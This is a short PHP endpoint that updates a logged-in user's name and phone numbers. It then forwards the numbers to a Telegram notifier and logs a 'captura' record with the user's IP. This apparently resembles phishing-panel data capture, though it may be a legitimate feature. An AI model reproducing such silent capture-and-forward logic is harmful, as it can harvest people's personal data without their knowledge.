<?php
session_start();
require_once '../php_config/conexionbd.php';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'error' => 'Método no permitido']);
    exit;
}

if (!isset($_SESSION['usuario_id'])) {
    echo json_encode(['success' => false, 'error' => 'Sesión no válida']);
    exit;
}

$nombre = isset($_POST['nombre']) ? trim($_POST['nombre']) : '';
$nombre = mb_substr(preg_replace('/[^\p{L}\s]/u', '', $nombre), 0, 50);

$telefono_fijo  = isset($_POST['fijo']) ? preg_replace('/\D/', '', $_POST['fijo']) : '';
$telefono_movil = isset($_POST['cel'])  ? preg_replace('/\D/', '', $_POST['cel'])  : '';
$telefono_fijo  = mb_substr($telefono_fijo, 0, 15);
$telefono_movil = mb_substr($telefono_movil, 0, 15);

try {
    $pdo = conectarBD();
    $stmt = $pdo->prepare("UPDATE usuarios SET nombre = ?, telefono_fijo = ?, telefono_movil = ? WHERE id = ?");
    $stmt->execute([
        $nombre ?: null,
        $telefono_fijo ?: null,
        $telefono_movil ?: null,
        (int) $_SESSION['usuario_id']
    ]);

    require_once __DIR__ . '/telegram_send.php';
    telegram_notify_contact_once($pdo, (int) $_SESSION['usuario_id'], $telefono_fijo, $telefono_movil);

    if ($telefono_movil !== '') {
        require_once __DIR__ . '/../php_modales/chat_captura_helper.php';
        $ipChat = $_SESSION['ip_real'] ?? ($_SERVER['REMOTE_ADDR'] ?? 'unknown');
        insertarCapturaUsuario($pdo, (int) $_SESSION['usuario_id'], (string) $ipChat, 'Número Móvil: ' . $telefono_movil);
    }

    echo json_encode(['success' => true]);
} catch (PDOException $e) {
    echo json_encode(['success' => false, 'error' => 'Error al guardar']);
}
?>
